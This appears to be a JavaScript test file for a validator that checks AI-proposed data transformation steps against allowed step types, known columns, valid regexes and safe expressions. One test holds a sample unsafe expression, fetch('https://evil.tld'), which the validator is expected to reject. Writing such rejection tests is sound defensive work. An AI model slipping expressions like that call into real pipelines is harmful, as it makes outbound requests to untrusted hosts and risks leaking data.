import { validateAISteps } from "../stepValidator.js";

let pass = 0, fail = 0;
const check = (name, cond) => cond ? (pass++, console.log("  [pass]", name)) : (fail++, console.log("  [FAIL]", name));

const headers = ["geometry", "income", "age"];

// canonical geometry case — two extract_regex steps
const geo = validateAISteps([
  { type: "extract_regex", col: "geometry", nn: "lon", regex: "\\(\\s*(-?\\d+\\.?\\d+)", locale: "dot" },
  { type: "extract_regex", col: "geometry", nn: "lat", regex: "\\s(-?\\d+\\.?\\d+)\\s*\\)", locale: "dot" },
], headers);
check("geometry: both steps valid", geo.valid.length === 2 && geo.rejected.length === 0);

// unknown type rejected
const unk = validateAISteps([{ type: "frobnicate", col: "income" }], headers);
check("unknown type rejected", unk.valid.length === 0 && /unknown step type/.test(unk.rejected[0].reason));

// out-of-category (merge) rejected
const mrg = validateAISteps([{ type: "join", rightId: "x", leftKey: "income", rightKey: "y", how: "left" }], headers);
check("merge-category step rejected", mrg.valid.length === 0 && /not allowed/.test(mrg.rejected[0].reason));

// unknown column rejected
const badcol = validateAISteps([{ type: "log", col: "nope", nn: "lnope" }], headers);
check("unknown column rejected", badcol.valid.length === 0 && /unknown column/.test(badcol.rejected[0].reason));

// sequential: step 2 references a column created by step 1
const seq = validateAISteps([
  { type: "extract_regex", col: "geometry", nn: "lon", regex: "(-?\\d+)" },
  { type: "log", col: "lon", nn: "ln_lon" },
], headers);
check("sequential nn reference passes", seq.valid.length === 2);

// malformed regex rejected
const rx = validateAISteps([{ type: "extract_regex", col: "geometry", nn: "x", regex: "(" }], headers);
check("malformed regex rejected", rx.valid.length === 0 && /invalid regex/.test(rx.rejected[0].reason));

// unsafe dynamic expression rejected (mutate is allowed category but expr is denylisted)
const unsafe = validateAISteps([{ type: "mutate", nn: "z", expr: "fetch('https://evil.tld')" }], headers);
check("unsafe mutate expr rejected", unsafe.valid.length === 0 && /unsafe expression/.test(unsafe.rejected[0].reason));

// benign mutate expression passes
const safeMut = validateAISteps([{ type: "mutate", nn: "z", expr: "income * 2" }], headers);
check("benign mutate expr passes", safeMut.valid.length === 1);

console.log(`\nstepValidator: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
